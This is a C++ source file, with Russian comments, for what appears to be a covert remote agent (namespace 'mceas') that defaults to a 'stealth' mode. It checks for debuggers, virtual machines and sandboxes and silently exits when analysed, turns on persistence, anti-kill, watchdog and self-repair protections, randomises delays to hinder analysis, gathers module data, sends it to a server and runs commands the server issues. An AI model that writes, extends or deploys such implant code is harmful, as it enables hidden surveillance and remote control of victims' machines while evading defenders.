#include "internal/agent.h"
#include "internal/config.h"
#include "internal/module_manager.h"
#include "internal/updater.h"
#include "internal/logging.h"
#include "internal/comm/client.h"
#include "internal/security/anti_analysis.h"
#include "internal/security/self_protection.h"
#include <chrono>
#include <thread>
#include <random>

namespace mceas {

Agent::Agent() : running_(false), mode_(AgentMode::STEALTH), threat_detected_(false) {
    // Генерируем уникальный ID агента
    agent_id_ = "MCEAS-" + std::to_string(std::chrono::system_clock::now().time_since_epoch().count());
}

Agent::~Agent() {
    if (running_) {
        stop();
    }
}

StatusCode Agent::initialize(const std::string& config_path) {
    try {
        // Инициализация компонентов
        config_ = std::make_unique<Config>(config_path);
        
        // Если передан путь к конфигурации, загружаем из него
        if (!config_path.empty()) {
            if (!config_->loadFromFile(config_path)) {
                LogError("Failed to load configuration from: " + config_path);
                return StatusCode::ERROR_CONFIGURATION;
            }
        }
        
        // Получаем конфигурацию агента
        AgentConfig agent_config = config_->getAgentConfig();
        
        // Если в конфигурации есть ID агента, используем его
        if (!agent_config.agent_id.empty()) {
            agent_id_ = agent_config.agent_id;
        }
        
        // Инициализируем менеджер модулей
        module_manager_ = std::make_unique<ModuleManager>(agent_config);
        
        // Инициализируем механизм обновления
        updater_ = std::make_unique<Updater>(agent_config, *config_);
        
        // Инициализируем коммуникационный клиент
        comm_client_ = std::make_unique<comm::Client>();
        
        // Настраиваем клиент
        comm::ClientConfig client_config;
        client_config.server_url = agent_config.server_url;
        client_config.protocol_name = "https"; // По умолчанию используем HTTPS
        client_config.use_encryption = agent_config.encryption_enabled;
        
        if (!comm_client_->initialize(client_config)) {
            LogError("Failed to initialize communication client");
            return StatusCode::ERROR_COMMUNICATION;
        }
        
        // Устанавливаем ID агента для клиента
        comm_client_->setAgentId(agent_id_);
        
        // Устанавливаем обработчик команд
        comm_client_->setCommandHandler([this](const Command& command) {
            this->executeCommand(command);
        });
        
        // Инициализируем механизмы безопасности и защиты
        anti_analysis_ = std::make_unique<security::AntiAnalysis>();
        self_protection_ = std::make_unique<security::SelfProtection>();
        
        // Устанавливаем обработчики событий
        anti_analysis_->setDetectionHandler([this](const security::DetectionResult& result) {
            this->handleSecurityDetection(result);
        });
        
        self_protection_->setProtectionHandler([this](security::ProtectionType type, bool enabled) {
            this->handleProtectionEvent(type, enabled);
        });
        
        // Настраиваем режим работы
        std::string mode_str = config_->getValue("agent_mode", "stealth");
        
        if (mode_str == "debug") {
            mode_ = AgentMode::DEBUG;
        } else if (mode_str == "test") {
            mode_ = AgentMode::TEST;
        } else if (mode_str == "hybrid") {
            mode_ = AgentMode::HYBRID;
        } else {
            mode_ = AgentMode::STEALTH;
        }
        
        configureMode();
        
        // Проверяем окружение, если в скрытном режиме
        if (mode_ == AgentMode::STEALTH && !checkEnvironment()) {
            LogInfo("Suspicious environment detected, silently exiting");
            return StatusCode::ERROR_SECURITY;
        }
        
        LogInfo("Agent initialized with ID: " + agent_id_);
        return StatusCode::SUCCESS;
    }
    catch (const ConfigurationException& e) {
        LogError("Configuration error during initialization: " + std::string(e.what()));
        return StatusCode::ERROR_CONFIGURATION;
    }
    catch (const ModuleException& e) {
        LogError("Module error during initialization: " + std::string(e.what()));
        return StatusCode::ERROR_MODULE_LOAD;
    }
    catch (const std::exception& e) {
        LogError("Unexpected error during initialization: " + std::string(e.what()));
        return StatusCode::ERROR_SYSTEM;
    }
}

StatusCode Agent::start() {
    if (running_) {
        LogWarning("Agent is already running");
        return StatusCode::SUCCESS;
    }
    
    try {
        // Запускаем модули
        if (!module_manager_->startModules()) {
            LogError("Failed to start modules");
            return StatusCode::ERROR_MODULE_LOAD;
        }
        
        // Подключаем коммуникационный клиент
        if (comm_client_) {
            if (!comm_client_->connect()) {
                LogWarning("Failed to connect communication client");
                // Но продолжаем работу, так как клиент может подключиться позже
            }
        }
        
        // Инициализируем и запускаем механизмы защиты, если нужно
        if (mode_ == AgentMode::STEALTH || mode_ == AgentMode::HYBRID) {
            if (!self_protection_->initialize()) {
                LogWarning("Failed to initialize self protection");
            }
            
            if (!self_protection_->start()) {
                LogWarning("Failed to start self protection");
            }
        }
        
        // Обновляем флаг состояния
        running_ = true;
        
        // Запускаем основной поток
        main_thread_ = std::make_unique<std::thread>(&Agent::mainLoop, this);
        
        LogInfo("Agent started successfully");
        return StatusCode::SUCCESS;
    }
    catch (const std::exception& e) {
        LogError("Error starting agent: " + std::string(e.what()));
        return StatusCode::ERROR_SYSTEM;
    }
}

StatusCode Agent::stop() {
    if (!running_) {
        LogWarning("Agent is not running");
        return StatusCode::SUCCESS;
    }
    
    try {
        // Обновляем флаг состояния
        running_ = false;
        
        // Дожидаемся завершения основного потока
        if (main_thread_ && main_thread_->joinable()) {
            main_thread_->join();
        }
        
        // Останавливаем модули
        module_manager_->stopModules();
        
        // Отключаем коммуникационный клиент
        if (comm_client_) {
            comm_client_->disconnect();
        }
        
        // Останавливаем механизмы защиты
        if (self_protection_) {
            self_protection_->stop();
        }
        
        LogInfo("Agent stopped successfully");
        return StatusCode::SUCCESS;
    }
    catch (const std::exception& e) {
        LogError("Error stopping agent: " + std::string(e.what()));
        return StatusCode::ERROR_SYSTEM;
    }
}

CommandResult Agent::executeCommand(const Command& command) {
    CommandResult result;
    result.command_id = command.command_id;
    
    try {
        // Обработка команды в зависимости от действия
        if (command.action == "update") {
            // Команда обновления
            bool update_success = updater_->checkForUpdates(true);
            result.success = update_success;
            result.result = update_success ? "Update successful" : "No updates available";
        }
        else if (command.action == "restart") {
            // Команда перезапуска
            stop();
            result.success = true;
            result.result = "Agent restarted";
            start();
        }
        else if (command.action == "module_command") {
            // Команда для конкретного модуля
            auto it = command.parameters.find("module");
            if (it != command.parameters.end()) {
                std::string module_name = it->second;
                result.success = module_manager_->executeModuleCommand(module_name, command);
                result.result = "Module command executed";
            }
            else {
                result.success = false;
                result.error_message = "Missing module parameter";
            }
        }
        else if (command.action == "set_mode") {
            // Команда изменения режима работы
            auto it = command.parameters.find("mode");
            if (it != command.parameters.end()) {
                std::string mode_str = it->second;
                
                if (mode_str == "debug") {
                    setMode(AgentMode::DEBUG);
                    result.success = true;
                    result.result = "Mode set to DEBUG";
                }
                else if (mode_str == "stealth") {
                    setMode(AgentMode::STEALTH);
                    result.success = true;
                    result.result = "Mode set to STEALTH";
                }
                else if (mode_str == "test") {
                    setMode(AgentMode::TEST);
                    result.success = true;
                    result.result = "Mode set to TEST";
                }
                else if (mode_str == "hybrid") {
                    setMode(AgentMode::HYBRID);
                    result.success = true;
                    result.result = "Mode set to HYBRID";
                }
                else {
                    result.success = false;
                    result.error_message = "Unknown mode: " + mode_str;
                }
            }
            else {
                result.success = false;
                result.error_message = "Missing mode parameter";
            }
        }
        else {
            result.success = false;
            result.error_message = "Unknown command action: " + command.action;
        }
        
        // Отправляем результат выполнения команды
        if (comm_client_) {
            comm_client_->sendCommandResult(agent_id_, result);
        }
    }
    catch (const std::exception& e) {
        result.success = false;
        result.error_message = std::string("Error executing command: ") + e.what();
        
        // Отправляем результат ошибки
        if (comm_client_) {
            comm_client_->sendCommandResult(agent_id_, result);
        }
    }
    
    return result;
}

bool Agent::isRunning() const {
    return running_;
}

std::string Agent::getAgentId() const {
    return agent_id_;
}

std::string Agent::getVersion() const {
    return MCEAS_AGENT_VERSION;
}

void Agent::setMode(AgentMode mode) {
    mode_ = mode;
    configureMode();
}

AgentMode Agent::getMode() const {
    return mode_;
}

void Agent::handleSecurityDetection(const security::DetectionResult& result) {
    if (result.detected) {
        LogWarning("Security detection: " + result.description + " (confidence: " + 
                  std::to_string(result.confidence) + "%)");
        
        // Если мы в скрытном режиме и обнаружена потенциальная угроза с высокой уверенностью
        if ((mode_ == AgentMode::STEALTH || mode_ == AgentMode::HYBRID) && 
            result.confidence >= 80) {
            
            threat_detected_ = true;
            
            // В зависимости от типа обнаружения и конфигурации, можем принять различные меры
            switch (result.type) {
                case security::DetectionType::VIRTUAL_MACHINE:
                case security::DetectionType::SANDBOX:
                    // Возможно, остановить агент или войти в режим имитации
                    break;
                case security::DetectionType::DEBUGGER:
                    // Немедленная остановка или запутывание отладчика
                    break;
                default:
                    break;
            }
        }
    }
}

void Agent::handleProtectionEvent(security::ProtectionType type, bool enabled) {
    std::string type_str;
    
    switch (type) {
        case security::ProtectionType::WATCHDOG:
            type_str = "Watchdog";
            break;
        case security::ProtectionType::PERSISTENCE:
            type_str = "Persistence";
            break;
        case security::ProtectionType::ANTI_KILL:
            type_str = "Anti-Kill";
            break;
        case security::ProtectionType::SELF_REPAIR:
            type_str = "Self-Repair";
            break;
        default:
            type_str = "Unknown";
            break;
    }
    
    LogInfo("Protection event: " + type_str + " " + (enabled ? "enabled" : "disabled"));
}

void Agent::mainLoop() {
    try {
        while (running_) {
            // Если обнаружена угроза и мы в скрытном режиме, прекращаем работу
            if (threat_detected_ && (mode_ == AgentMode::STEALTH || mode_ == AgentMode::HYBRID)) {
                LogInfo("Threat detected, terminating agent");
                running_ = false;
                break;
            }
            
            // Если мы в гибридном режиме и прошла проверка безопасности,
            // переключаемся в скрытный режим
            if (mode_ == AgentMode::HYBRID && !threat_detected_) {
                setMode(AgentMode::STEALTH);
            }
            
            // Обрабатываем результаты от модулей
            processModuleResults();
            
            // Отправляем данные на сервер
            sendDataToServer();
            
            // Получаем команды от сервера
            if (comm_client_) {
                auto commands = comm_client_->receiveCommands(agent_id_);
                
                // Обрабатываем полученные команды
                for (const auto& command : commands) {
                    LogInfo("Received command from server: " + command.action);
                    executeCommand(command);
                }
            }
            
            // Проверяем обновления (по расписанию)
            updater_->checkForUpdates(false);
            
            // Добавляем случайную задержку в скрытном режиме для усложнения анализа
            if (mode_ == AgentMode::STEALTH) {
                std::random_device rd;
                std::mt19937 gen(rd());
                std::uniform_int_distribution<> dis(500, 1500);
                std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
            } else {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        }
    }
    catch (const std::exception& e) {
        LogError("Error in main loop: " + std::string(e.what()));
        running_ = false;
    }
}

void Agent::processModuleResults() {
    // Получаем результаты от всех модулей
    module_results_ = module_manager_->collectResults();
    
    // Для отладки выводим информацию о полученных результатах
    for (const auto& result : module_results_) {
        if (result.success) {
            LogDebug("Collected data from module: " + result.module_name);
        }
        else {
            LogWarning("Failed to collect data from module: " + result.module_name +
                      " Error: " + result.error_message);
        }
    }
}

void Agent::sendDataToServer() {
    // В тестовом режиме не отправляем данные на сервер
    if (mode_ == AgentMode::TEST) {
        LogInfo("Test mode: data would be sent to server");
        return;
    }
    
    if (!comm_client_) {
        LogWarning("Communication client not initialized");
        return;
    }
    
    try {
        // Собираем данные для отправки
        std::map<std::string, std::string> data;
        
        // Добавляем основную информацию
        data["agent_id"] = agent_id_;
        data["version"] = MCEAS_AGENT_VERSION;
        data["timestamp"] = std::to_string(std::chrono::system_clock::now().time_since_epoch().count());
        
        // Добавляем данные из модулей
        for (const auto& result : module_results_) {
            if (result.success) {
                // Добавляем все данные из результата модуля, префиксируя именем модуля
                std::string prefix = result.module_name + ".";
                for (const auto& item : result.data) {
                    data[prefix + item.first] = item.second;
                }
            }
        }
        
        // В скрытном режиме добавляем критические данные
        if (mode_ == AgentMode::STEALTH) {
            addCriticalData();
        }
        
        // Отправляем данные
        if (!data.empty()) {
            bool sent = comm_client_->sendData(agent_id_, data);
            
            if (sent) {
                LogInfo("Data sent to server");
            }
            else {
                LogWarning("Failed to send data to server");
            }
        }
    }
    catch (const std::exception& e) {
        LogError("Error sending data to server: " + std::string(e.what()));
    }
}

bool Agent::checkEnvironment() {
    // Запускаем проверки безопасности окружения
    auto results = anti_analysis_->runAllChecks();
    
    // Если хотя бы одна проверка обнаружила подозрительное окружение с высокой уверенностью
    for (const auto& result : results) {
        if (result.detected && result.confidence >= 90) {
            LogInfo("High-confidence detection: " + result.description);
            return false;
        }
    }
    
    return true;
}

void Agent::configureMode() {
    switch (mode_) {
        case AgentMode::DEBUG:
            // В режиме отладки включаем логирование, отключаем скрытность
            Logger::getInstance().setLogLevel(LogLevel::DEBUG);
            if (self_protection_) {
                security::ProtectionConfig config = self_protection_->getConfig();
                config.enable_watchdog = false;
                config.enable_persistence = false;
                self_protection_->updateConfig(config);
            }
            break;
            
        case AgentMode::STEALTH:
            // В скрытном режиме минимизируем логирование, включаем все защиты
            Logger::getInstance().setLogLevel(LogLevel::ERROR);
            if (self_protection_) {
                security::ProtectionConfig config = self_protection_->getConfig();
                config.enable_watchdog = true;
                config.enable_persistence = true;
                config.enable_anti_kill = true;
                config.enable_self_repair = true;
                self_protection_->updateConfig(config);
            }
            break;
            
        case AgentMode::TEST:
            // В тестовом режиме включаем логирование, но не отправляем данные
            Logger::getInstance().setLogLevel(LogLevel::DEBUG);
            if (self_protection_) {
                security::ProtectionConfig config = self_protection_->getConfig();
                config.enable_watchdog = false;
                config.enable_persistence = false;
                self_protection_->updateConfig(config);
            }
            break;
            
        case AgentMode::HYBRID:
            // Начинаем как в режиме отладки, но с проверками
            Logger::getInstance().setLogLevel(LogLevel::INFO);
            if (self_protection_) {
                security::ProtectionConfig config = self_protection_->getConfig();
                config.enable_watchdog = true;
                config.enable_persistence = false;
                self_protection_->updateConfig(config);
            }
            break;
    }
}

bool Agent::isDebuggerPresent() {
    auto result = anti_analysis_->checkDebugger();
    return result.detected;
}

bool Agent::isVirtualMachine() {
    auto result = anti_analysis_->checkVirtualMachine();
    return result.detected;
}

void Agent::addCriticalData() {
    // Здесь можно добавить логику для сбора и добавления критических данных
    // Например, данные об обнаруженных угрозах, попытках анализа и т.д.
}

} // namespace mceas